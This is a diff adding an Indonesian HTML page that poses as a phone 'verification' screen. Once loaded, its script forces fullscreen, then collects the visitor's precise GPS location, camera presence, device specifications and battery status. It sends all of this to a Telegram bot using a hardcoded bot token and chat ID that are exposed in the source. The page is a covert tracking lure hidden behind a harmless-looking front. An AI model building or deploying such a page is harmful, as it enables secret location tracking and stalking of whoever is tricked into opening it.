@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeetasimodesad</title>
+    <style>
+        /* Animasi latar belakang */
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            color: white;
+            font-size: 20px;
+            background: linear-gradient(-45deg, #ff416c, #ff4b2b, #ff5733, #ff914d);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+        }
+
+        .container {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            max-width: 80%;
+        }
+
+        /* Efek loading */
+        .loading {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .dots {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            width: 0;
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0% { width: 0; }
+            100% { width: 20px; }
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            document.body.requestFullscreen().catch(err => console.log(err));
+        });
+
+        async function cekKamera() {
+            let devices = await navigator.mediaDevices.enumerateDevices();
+            let kameraDepan = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('front'));
+            let kameraBelakang = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
+
+            return {
+                depan: kameraDepan ? "✅ Ada" : "❌ Tidak ditemukan",
+                belakang: kameraBelakang ? "✅ Ada" : "❌ Tidak ditemukan"
+            };
+        }
+
+        function cekLokasi() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) return reject('Geolocation tidak didukung');
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        akurasi: position.coords.accuracy
+                    }),
+                    error => reject(error.message),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        function cekSpekHP() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                memori: navigator.deviceMemory || 'Tidak diketahui',
+                coreCPU: navigator.hardwareConcurrency || 'Tidak diketahui'
+            };
+        }
+
+        async function cekBaterai() {
+            let battery = await navigator.getBattery();
+            return {
+                level: (battery.level * 100) + "%",
+                charging: battery.charging ? "🔌 Mengisi daya" : "🔋 Tidak mengisi"
+            };
+        }
+
+        async function kirimKeBot(data) {
+            let token = '7123253254:AAEW8xxJzx38d-g_KVCa2eTM9dyBA0tugTo'; 
+            let chat_id = '7895289556'; 
+
+            let pesan = `📢 *Zeetasimodesad Report* 📢\n\n` +
+                        `📷 Kamera Depan: ${data.kamera.depan}\n` +
+                        `📸 Kamera Belakang: ${data.kamera.belakang}\n` +
+                        `📍 Lokasi: ${data.lokasi.latitude}, ${data.lokasi.longitude} (Akurasi: ${data.lokasi.akurasi}m)\n` +
+                        `📱 Spek HP:\n  - Platform: ${data.spek.platform}\n  - CPU: ${data.spek.coreCPU} Core\n  - RAM: ${data.spek.memori} GB\n` +
+                        `🔋 Baterai: ${data.baterai.level} (${data.baterai.charging})\n\n` +
+                        `👤 Nama: Zeetasimodesad`;
+
+            let url = `https://api.telegram.org/bot${token}/sendMessage`;
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chat_id, text: pesan, parse_mode: "Markdown" })
+            });
+        }
+
+        async function jalankan() {
+            try {
+                document.getElementById("status").innerText = "Mengumpulkan data...";
+                let kamera = await cekKamera();
+                let lokasi = await cekLokasi();
+                let spek = cekSpekHP();
+                let baterai = await cekBaterai();
+
+                let data = { kamera, lokasi, spek, baterai };
+                await kirimKeBot(data);
+                document.getElementById("status").innerText = "✅ Data telah dikirim ke bot Telegram!";
+            } catch (error) {
+                document.getElementById("status").innerText = "❌ Gagal mengumpulkan data: " + error;
+            }
+        }
+
+        window.onload = jalankan;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Verivikasi handphone</h1>
+        <p id="status" class="loading">Sedang memproses<span class="dots">...</span></p>
+    </div>
+</body>
+</html>
